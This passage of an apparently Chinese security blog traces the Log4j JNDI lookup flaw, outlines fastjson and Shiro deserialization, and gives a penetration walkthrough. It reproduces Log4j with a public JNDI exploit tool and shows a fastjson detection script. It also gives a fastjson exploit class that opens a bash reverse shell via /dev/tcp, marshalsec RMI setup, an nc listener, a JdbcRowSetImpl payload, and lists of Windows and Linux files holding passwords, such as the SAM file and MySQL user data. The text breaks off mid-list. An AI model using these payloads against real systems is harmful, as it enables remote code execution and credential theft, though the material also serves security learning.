class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这是他的jar包,注意导入这个的时候做好要一个干净的maven项目,不然有可能导入其他版本的</p><p>导致这个漏洞主要是因为log4j会处理<code>$&#123;&#125;</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">logger.error(<span class="hljs-string">&quot;$&#123;jndi:ldap://vj40sh.dnslog.cn&#125;&quot;</span>);<br></code></pre></td></tr></table></figure><p>我们使用error方法来测试,并跟踪传入的数据,使用的工具主要是idea</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.config</span>.LoggerConfig<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/log4j-1.png" alt="image-20220312165641262"></p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311642619.png" alt="image-20220312165727944"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.logging</span><span class="hljs-selector-class">.log4j</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.config</span>.AppenderControl<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/log4j-3.png" alt="image-20220312165904294"></p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/log4j_4.png" alt="image-20220312170058354"></p><p>可以看到这个toText里面有一个Serializer2感觉很敏感,进入这个函数,进入之后继续跟进</p><p>之后在这个函数才是真正对字符串进行操作的函数,一共有11个,我们重点关注第9个</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311644720.png" alt="image-20220312170444068"></p><p>可以看出这里对<code>$&#123;&#125;</code>进行了分析</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311649735.png" alt="image-20220312170953055"></p><p>由于下面的递归层数太多了所以直接跳到StrSubstitutor.resolveVariable(可以直接在这里打断点)</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311653024.png" alt="image-20220312171606019"></p><p>然后进入lookup函数</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311653792.png" alt="image-20220312172253870"></p><p>这里显示了所有的类型</p><p>并且JndiLookup.lookup是真正的触发函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> LogEvent event, <span class="hljs-keyword">final</span> String key)</span> &#123;<br>    <span class="hljs-keyword">if</span> (key == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jndiName</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.convertJndiName(key);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">JndiManager</span> <span class="hljs-variable">jndiManager</span> <span class="hljs-operator">=</span> JndiManager.getDefaultManager();<br>            <span class="hljs-type">Throwable</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            String var6;<br>            <span class="hljs-keyword">try</span> &#123;<br>                var6 = Objects.toString(jndiManager.lookup(jndiName), (String)<span class="hljs-literal">null</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var16) &#123;<br>                var5 = var16;<br>                <span class="hljs-keyword">throw</span> var16;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (jndiManager != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (var5 != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            jndiManager.close();<br>                        &#125; <span class="hljs-keyword">catch</span> (Throwable var15) &#123;<br>                            var5.addSuppressed(var15);<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        jndiManager.close();<br>                    &#125;<br>                &#125;<br><br>            &#125;<br><br>            <span class="hljs-keyword">return</span> var6;<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException var18) &#123;<br>            LOGGER.warn(LOOKUP, <span class="hljs-string">&quot;Error looking up JNDI resource [&#123;&#125;].&quot;</span>, jndiName, var18);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>由于别人写的挺好那么我就不造轮子了</p><p><a href="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/">https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/</a></p><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>是用于JSON和Java Object之间相互转化的类</p><p>jndi(Java Naming and Directory Interface)所包含支持的服务</p><blockquote><p>LDAP （Lightweight Directory Access Protocol） 轻量级目录访问协议</p><p>CORBA （Common Object Request Broker Architecture） 公共对象请求代理结构服务</p><p>RMI（Java Remote Method Invocation）JAVA远程远程方法调用注册</p><p>DNS（Domain Name Service）域名服务</p></blockquote><p>根据@type来反序列化文件，导致加载了本地的其他类从而执行恶意代码</p><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;parser&#x2F;DefaultJSONParser.java的parseObject函数中发生的</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311653050.jpeg" alt="image-20220313153402012"></p><p>这里根据具体的类型来使用deserializer类来进行反序列化，之后序列化并return</p><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/202307311654590.jpeg" alt="image-20220313153539964"></p><p>不过会经过com&#x2F;alibaba&#x2F;fastjson&#x2F;parser&#x2F;ParserConfig.java的白名单，黑名单检测而ParserConfig函数则put了很多默认的类</p><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞</p>]]></content>
    
    
    
    <tags>
      
      <tag>安全</tag>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透实践</title>
    <link href="/2022/02/06/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"/>
    <url>/2022/02/06/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透实践"><a href="#渗透实践" class="headerlink" title="渗透实践"></a>渗透实践</h1><p>首先要获得该网站的书面渗透授权</p><p>1.收集信息</p><ul><li>服务器的相关信息（ip，系统类型，端口号，waf）<ul><li>使用站长：<a href="https://whois.chinaz.com/%E6%9F%A5%E6%89%BE%E5%9F%9F%E5%90%8D%E5%B9%B6%E4%B8%94%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E5%8F%8D%E6%9F%A5%E6%9D%A5%E6%89%BE%E6%97%81%E7%AB%99">https://whois.chinaz.com/查找域名并且可以进行反查来找旁站</a></li><li><a href="http://wepcc.com/%E5%A4%9A%E5%9C%B0ping%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8cdn">http://wepcc.com/多地ping查看是否存在cdn</a></li></ul></li><li>网站指纹（cms，cdn，证书，dns记录）</li><li>whois信息，姓名，备案，邮箱，电话反查询</li><li>子域名，旁站，C段</li><li>Google hacking针对的渗透，pdf，中间件，弱口令</li><li>扫描目录，爆后台，网站banner，测试文件，敏感文件泄露</li><li>传输协议，通用漏洞，exp，github源码</li></ul><p>2.漏洞挖掘</p><ul><li>浏览网站，看看网站规模，功能，特点等</li><li>端口，弱口令，目录等扫描</li><li>XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</li></ul><h3 id="复现实战"><a href="#复现实战" class="headerlink" title="复现实战"></a>复现实战</h3><p>Log4j</p><p>首先在GitHub下载poc</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>然后随便搭建一个SpringBoot项目</p><p>然后创建一个Controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br>    <span class="hljs-meta">@GetMapping(&quot;/aaaa&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">(String i)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>            ctx.lookup(i);<br>            ctx.lookup(i);<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;111&quot;</span>;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后启动服务</p><blockquote><p>Apache-Log4j-Learning-main\tools&gt;java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “C:\Windows\System32\calc.exe” -A “127.0.0.1”</p><p>[-C 执行命令] [-A 目标ip]</p></blockquote><p><img src="https://raw.githubusercontent.com/wodiu188/Images/main/blog_images/%E5%AE%9E%E6%88%98-1.png" alt="image-20220210112011646"></p><p>根据jdk的版本来选择不同的接口地址,只需要传递进去即可执行命令</p><p><strong>修复方法</strong></p><p>项目启动的时候运行</p><blockquote><p>-Dlog4j2.formatMsgNoLookups&#x3D;true</p></blockquote><p>升级log4j2版本至2.15.0</p><p>fastjson</p><p>&#x3D;&#x3D;注意Java版本不能太高了&#x3D;&#x3D;</p><p>漏洞检测脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson_1_2_24</span>():<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">url</span>(<span class="hljs-params">self</span>):<br>        parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;fastjson 1.2.24 反序列化导致任意命令执行漏洞检测POC&#x27;</span>)<br>        parser.add_argument(<span class="hljs-string">&#x27;target_url&#x27;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The target address,example: http://192.168.140.153:8090&#x27;</span>)<br>        args = parser.parse_args() <br>        <span class="hljs-keyword">global</span> target_url<br>        target_url = args.target_url<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;fastjson 1.2.24 反序列化导致任意命令执行漏洞检测POC!!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在执行检测...&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;目标地址：&quot;</span>,target_url)<br>        <span class="hljs-keyword">return</span> target_url<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">randmd5</span>(<span class="hljs-params">self</span>):<br>        new_md5 = md5()<br>        new_md5.update(<span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>)).encode())<br>        <span class="hljs-keyword">return</span> new_md5.hexdigest()[:<span class="hljs-number">6</span>]  <span class="hljs-comment">#取前6位</span><br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_domain</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">global</span> header<br>        header=&#123;<span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>                <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0&#x27;</span>&#125;<br>        <span class="hljs-keyword">global</span> rand<br>        rand = self.randmd5()<br>        getDoMain = <span class="hljs-string">&#x27;http://www.dnslog.cn/getdomain.php&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            r = requests.get(getDoMain, headers=header, timeout=<span class="hljs-number">5</span>)<br>            <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>                <span class="hljs-keyword">global</span> dnslogUrl<br>                dnslogUrl = rand + <span class="hljs-string">&#x27;.&#x27;</span> + r.text<br>            <span class="hljs-keyword">else</span>:<br>                sys.exit()<br>            <span class="hljs-built_in">print</span>(dnslogUrl)<br>            <span class="hljs-keyword">return</span> dnslogUrl<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Exception found&#x27;</span>)<br>            sys.exit()<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post_target</span>(<span class="hljs-params">self</span>):<br>        headers = &#123;<br>            <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;*/*&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;en&#x27;</span>,<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;</span>,<br>            <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,    <br>        &#125;<br>        data = &#123;<span class="hljs-string">&quot;zeo&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:dnslogUrl&#125;&#125;<br>        <span class="hljs-keyword">try</span>:<br>            re = requests.post(url=target_url,data=json.dumps(data),headers=headers,timeout=<span class="hljs-number">5</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在请求目标地址...&quot;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Exception found&#x27;</span>)<br>            sys.exit()<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_records</span>(<span class="hljs-params">self</span>):<br>        getRecords = <span class="hljs-string">&#x27;http://www.dnslog.cn/getrecords.php&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            res = requests.get(getRecords,headers=header,timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请求失败！&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">if</span> rand <span class="hljs-keyword">in</span> res.text:<br>                <span class="hljs-built_in">print</span>(res.text)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;疑似存在漏洞&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不存在漏洞&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请求失败！&quot;</span>)<br>            sys.exit(<span class="hljs-number">0</span>)<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">self</span>):<br>        self.url()<br>        self.randmd5()<br>        self.get_domain()<br>        self.post_target()<br>        self.get_records()<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exploit = Fastjson_1_2_24()<br>    exploit.main()<br></code></pre></td></tr></table></figure><p>首先检测是否存在漏洞</p><p>手动测试</p><blockquote><p>{“zeo”:{“@type”:”java.net.Inet4Address”,”val”:”y1nhma.dnslog.cn”}} </p></blockquote><p>存在漏洞则开始攻击</p><p>首先我们创建一个Exploit</p><p>exp.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">aaa</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>            String[] commands = &#123;<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/接受shell的ip/1234 0&gt;&amp;1&quot;</span>&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br>            pc.waitFor();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e) &#123; &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>然后使用javac exp.java编译成class文件</p></blockquote><p>然后构造一个目录监听网站</p><blockquote><p>python2 -m SimpleHTTPServer</p><p>均可</p><p>python3 -m http.server </p></blockquote><p>下载rmi服务器</p><blockquote><p>git clone <a href="https://github.com/mbechler/marshalsec%EF%BC%88%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%8E%BBgithub%E4%B8%8B%E8%BD%BD%E7%84%B6%E5%90%8E%E4%BC%A0%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89">https://github.com/mbechler/marshalsec（可以直接去github下载然后传到服务器）</a></p><p>cd marshalsec </p><p>mvn clean package -DskipTests （需要等一会）</p></blockquote><blockquote><p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://python服务器ip:python服务器端口号/#exp&quot;">http://python服务器ip:python服务器端口号/#exp&quot;</a> 9999 </p></blockquote><p>&#x3D;&#x3D;exp.class要和python启动目录在同一文件夹下&#x3D;&#x3D;</p><blockquote><p>使用nc进行监听</p><p>nc -lvp 1234</p></blockquote><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://rmi的ip:rmi的端口/exp&quot;</span>,<br>        <span class="hljs-string">&quot;autoCommit&quot;</span>:true<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="mysql和mssql提权"><a href="#mysql和mssql提权" class="headerlink" title="mysql和mssql提权"></a>mysql和mssql提权</h3><p>下面是常见的文件</p><p>Windows</p><blockquote><ol><li>c:&#x2F;boot.ini &#x2F;&#x2F;查看系统版本 </li><li>c:&#x2F;windows&#x2F;php.ini &#x2F;&#x2F;php配置信息 </li><li>c:&#x2F;windows&#x2F;my.ini &#x2F;&#x2F;MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 </li><li>c:&#x2F;winnt&#x2F;php.ini </li><li>c:&#x2F;winnt&#x2F;my.ini </li><li>c:\mysql\data\mysql\user.MYD &#x2F;&#x2F;存储了mysql.user表中的数据库连接密码 </li><li>c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini &#x2F;&#x2F;存储了虚拟主机网站路径和密码 </li><li>c:\Program Files\Serv-U\ServUDaemon.ini </li><li>c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置 </li><li>c:\windows\repair\sam &#x2F;&#x2F;存储了WINDOWS系统初次安装的密码 </li><li>c:\Program Files\ Serv-U\ServUAdmin.exe &#x2F;&#x2F;6.0版本以前的serv-u管理员密码存储于此 </li><li>c:\Program Files\RhinoSoft.com\ServUDaemon.exe </li><li>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere*.cif文件 </li><li>&#x2F;&#x2F;存储了pcAnywhere的登陆密码 </li><li>c:\Program Files\Apache <strong>Group</strong>\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf &#x2F;&#x2F;查看WINDOWS系统apache文件 </li><li>c:&#x2F;Resin-3.0.14&#x2F;conf&#x2F;resin.conf &#x2F;&#x2F;查看jsp开发的网站 resin文件配置信息. </li><li>c:&#x2F;Resin&#x2F;conf&#x2F;resin.conf &#x2F;usr&#x2F;<strong>local</strong>&#x2F;resin&#x2F;conf&#x2F;resin.conf 查看linux系统配置的JSP虚拟主机 </li><li>d:\APACHE\Apache2\conf\httpd.conf </li><li>C:\Program Files\mysql\my.ini </li><li>C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</li></ol></blockquote><p>Linux</p><blockquote><ol><li>&#x2F;usr&#x2F;<strong>local</strong>&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache2缺省配置文件 </li><li>&#x2F;usr&#x2F;<strong>local</strong>&#x2F;apache2&#x2F;conf&#x2F;httpd.conf </li><li>&#x2F;usr&#x2F;<strong>local</strong>&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf &#x2F;&#x2F;虚拟网站设置 </li><li>&#x2F;usr&#x2F;<strong>local</strong>&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关设置 </li><li>&#x2F;etc&#x2F;sysconfig&#x2F;iptables &#x2F;&#x2F;从中得到防火墙规则策略 </li><li>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; apache配置文件 </li><li>&#x2F;etc&#x2F;rsyncd.conf &#x2F;&#x2F;同步程序配置文件 </li><li>&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql的配置文件 </li><li>&#x2F;etc&#x2F;redhat-release &#x2F;&#x2F;系统版本 </li><li>&#x2F;etc&#x2F;issue </li><li>&#x2F;etc&#x2F;issue.net </li><li>&#x2F;usr&#x2F;<strong>local</strong>&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关设置 </li><li>&#x2F;usr&#x2F;<strong>local</strong>&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf &#x2F;&#x2F;虚拟网站设置 </li><li>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf或&#x2F;usr&#x2F;<strong>local</strong>&#x2F;apche&#x2F;conf&#x2F;httpd.conf 查看linux APACHE虚拟主机配置文件 </li><li>&#x2F;usr&#x2F;<strong>local</strong>&#x2F;resin-3.0.22&#x2F;conf&#x2F;resin.conf 针对3.0.22的RESIN配置文件查看 </li><li>&#x2F;usr&#x2F;<strong>local</strong>&#x2F;resin-pro-3.0.22&#x2F;conf&#x2F;resin.conf 同上 </li><li>&#x2F;usr&#x2F;<strong>local</strong>&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf APASHE虚拟主机查看 </li><li>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf或&#x2F;usr&#x2F;<strong>local</strong>&#x2F;apche&#x2F;conf &#x2F;httpd.conf 查看linux APACHE虚拟主机配置文件 </li><li>&#x2F;usr&#x2F;<strong>local</strong>&#x2F;resin-3.0.22&#x2F;conf&#x2F;resin.conf 针对3.0.22的RESIN配置文件查看 